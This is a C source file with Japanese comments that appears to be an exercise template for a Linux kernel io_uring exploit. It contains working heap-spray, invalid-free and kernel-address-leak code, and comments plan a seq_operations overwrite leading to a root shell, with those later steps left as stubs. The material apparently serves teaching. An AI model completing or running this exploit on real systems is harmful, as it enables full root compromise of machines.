#include <assert.h>
#include <fcntl.h>
#include <liburing.h>
#include <linux/types.h>
#include <linux/xattr.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <unistd.h>

#define UNIMPLEMENTED() assert(0 && "unimplemented")
#define UNIMPLEMENTED_(n) (n)
#define errExit(msg)    \
  do {                  \
    perror(msg);        \
    exit(EXIT_FAILURE); \
  } while (0)
#define WAIT()            \
  do {                    \
    puts("[WAITING...]"); \
    getchar();            \
  } while (0)
#define ulong unsigned long
#define PAGE 0x1000UL

#define NUM_IOBUF 0x100
char iobufs[PAGE][NUM_IOBUF] = {0};

/**
 * /proc/self/mapsを開く
 *
 * @return int /proc/self/mapsのfd
 */
int open_maps(void) {
  int fd = open("/proc/self/maps", O_RDONLY);
  assert(fd >= 2);
  return fd;
}

/**
 * @brief io_uringをセットアップする
 *
 * @param ring io_uring
 */
void init_uring(struct io_uring *ring) { io_uring_queue_init(1024, ring, 0); }

/**
 * @brief Buffer Group を使ってreadする
 *
 * @param ring io_uring
 * @param fd readしたいファイルのfd
 * @param size readするサイズ
 * @param offset readするオフセット
 * @param bgid Buffer Group の BGID(Buffer Group ID)
 */
void ring_submit_read(struct io_uring *ring, int fd, size_t size, ulong offset,
                      int bgid) {
  struct io_uring_sqe *sqe = NULL;

  // 利用可能なSQEを取得する
  sqe = io_uring_get_sqe(ring);
  // SQEにリクエストを詰める
  io_uring_prep_read(sqe, fd, NULL, size, offset);
  // Buffer Groupを使うようにフラグを設定
  io_uring_sqe_set_flags(sqe, IOSQE_BUFFER_SELECT);
  // BGIDを設定 (struct io_uring_sqeの定義を参考)
  sqe->buf_group = bgid;
  // kernelに通知する
  io_uring_submit(ring);
}

/**
 * @brief Buffer Groupをkernelと共有する
 *
 * @param ring io_uring
 * @param buf_addr 共有したいバッファの先頭アドレス
 * @param len 共有したいバッファの1つ分のサイズ
 * @param num 共有したいバッファの数
 * @param bgid 共有したい Buffer Group の Group ID
 * @param bid_start 共有したい Buffer Group の Buffer ID の開始番号
 */
void ring_submit_buffer(struct io_uring *ring, char *buf_addr, int len, int num,
                        int bgid, int bid_start) {
  struct io_uring_sqe *sqe = NULL;
  struct io_uring_cqe *cqe = NULL;

  // 利用可能なSQEを取得する
  sqe = io_uring_get_sqe(ring);
  // SQEにリクエストを詰める
  io_uring_prep_provide_buffers(sqe, buf_addr, len, num, bgid, bid_start);
  // kernelに通知する
  assert(io_uring_submit(ring) >= 0);

  // CQEのレスポンスを待つ
  io_uring_wait_cqe(ring, &cqe);
  io_uring_cqe_seen(ring, cqe);
}

/**
 * @brief CQにレスポンスが返ってくるまで待つ
 *
 * @return int CQEのres (使われたバッファのBID)
 *
 * @param ring io_uring
 */
void ring_wait_cqe(struct io_uring *ring) {
  struct io_uring_cqe *cqe = NULL;

  // レスポンスが返ってきたCQEを取得する
  io_uring_wait_cqe(ring, &cqe);
  assert(cqe->res >= 0);
  io_uring_cqe_seen(ring, cqe);
}

#define MSGMSG_HEADER_SIZE 0x30UL  // struct `struct msg_msg` のヘッダサイズ
#define DATALEN_MSG (PAGE - MSGMSG_HEADER_SIZE)
#define MSGMSG_SIZE 0x20  // 確保したいメッセージのサイズ (kmalloc-32)
struct msgmsg20 {
  long mtype;
  char mtext[(MSGMSG_HEADER_SIZE + DATALEN_MSG) + MSGMSG_SIZE -
             8];  // struct `msgseg`のヘッダサイズ
};

/**
 * @brief kmalloc-32に0x20サイズの構造体を確保する。
 *
 * @param msg `struct msgmsg20`
 * @param num 確保したい構造体の数
 *
 * @return int msggetの返り値。`msgrcv()`で使う。
 */
int allocate_msgmsg20(struct msgmsg20 *msg, int num) {
  memset(&msg->mtext, 'A', sizeof(msg->mtext));

  int qid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
  for (int ix = 0; ix != num; ++ix) {
    if (msgsnd(qid, msg, sizeof(msg->mtext) - MSGMSG_HEADER_SIZE, 0) < 0)
      errExit("msgsnd");
  }
  return qid;
}

/**
 * @brief kmalloc-32に`shm_file_data`を1つ確保する。
 */
void allocate_shm_file_data(void) {
  int shmid = shmget(IPC_PRIVATE, 0x1000, 0666 | IPC_CREAT);
  void *addr = shmat(shmid, NULL, 0);
  assert(addr != (void *)-1);
}

ulong kbase = 0;

/**
 * @brief rootが取れるようなcredをcommitする。
 */
void *get_root() {
  typedef void *(*commit_creds_t)(void *);
  typedef struct cred *(*prepare_kernel_cred_t)(void *);

  UNIMPLEMENTED();
}

void nop(void) { return; }

int main(void) {
  struct io_uring ring;
  struct msgmsg20 msg = {.mtype = 0x1};
  int fd = open_maps();

  // setxattrで利用するようのダミーファイルを作成
#define SETXATTR_FILE_NAME "/tmp/setxattrf"
  system("echo setxattr > " SETXATTR_FILE_NAME);

  // ringの初期化
  init_uring(&ring);

  /**
   * kmalloc-32に`io_buffer`を大量に確保する。
   * kheap内を整理する目的 (heap feng shui).
   */
  puts("[+] Spraying kmalloc-32 with `io_buffer` ...");
  ring_submit_buffer(&ring, (char *)iobufs, PAGE, NUM_IOBUF, 0, 0);

  /**
   * `msg_msg` / `msg_seg`をkmalloc-32内の`io_buffer`の直後に確保する
   */
  puts("[+] Spraying msg_msg with size 0x20...");
  int qid = allocate_msgmsg20(&msg, 0x1);

  /**
   * `io_buffer`のInvalid Freeを発生させて先程確保したメッセージを解法する。
   */
  puts("[+] Invoking invalid free...");
  ring_submit_read(&ring, fd, 0x20, 0, 0);
  ring_wait_cqe(&ring);

  /**
   * `shm_file_data`をkmalloc-32に確保する。
   * ついさっき解放したメッセージに重ねて確保される。
   */
  puts("[+] Allocating shm_file_data on UAF-ed msg...");
  allocate_shm_file_data();

  /**
   * メッセージの上に重なった`shm_file_data`を読む。
   * `init_ipc_ns`のアドレスがleakできる。
   */
  puts("[+] Leaking UAF-ed msg_msg...");
  ssize_t n_rcv = msgrcv(qid, &msg, sizeof(msg), msg.mtype, MSG_NOERROR);
  printf("[!] 0x%lX bytes received\n", n_rcv);
  ulong *leaked = (ulong *)&msg.mtext[DATALEN_MSG];
  const ulong init_ipc_ns = leaked[0];
  kbase = init_ipc_ns - 0xEB0D60;
  printf("[!] init_ipc_ns: 0x%lx\n", init_ipc_ns);
  printf("[!] kbase: 0x%lx\n", kbase);

  /**
   * もう一度大量に`io_buffer`をkmalloc-32に確保する。
   * NOTE: BGIDは先ほどと別のものを使う。
   */
  puts("[+] Spraying kmalloc-32 with `io_buffer` again...");
  UNIMPLEMENTED();

  /**
   * `seq_operations`を`io_buffer`の直後に確保する。
   */
  puts("[+] Allocating seq_operations on io_buffer...");
  UNIMPLEMENTED();

  /**
   * Invalid Freeを使って先程確保した`seq_operations`を解放する。
   */
  puts("[!] Invoking invalid free...");
  UNIMPLEMENTED();

  /*********** ここまで`p7-rip.c`と同じ *********************/

  /**
   * `setxattr`を使って先程解放した`seq_operations`に対して`get_root()`のアドレスを書き込む
   *
   * NOTE:
   * get_root()を呼んだあとに`.stop()`を呼ぶため、これも上書きする必要がある。
   */
  puts("[!] Overwriting seq_operations using UAF...");
  UNIMPLEMENTED();

  /**
   * `seq_operations`の`.start`関数ポインタを呼び出す。
   * この関数ポインタは`get_root()`に書き換えられているため、このアドレスにRIPが飛ぶ。
   */
  puts("[!] Calling seq_operations.start...");
  UNIMPLEMENTED();

  /**
   * rootが奪えたことを確認し、シェルを開く。
   */
  printf("[!] WHOAMI: uid=%d, euid=%d\n", getuid(), geteuid());
  puts("[!] Here's your root shell :)");
  UNIMPLEMENTED();

  sleep(9999);  // unreachable

  return 0;
}
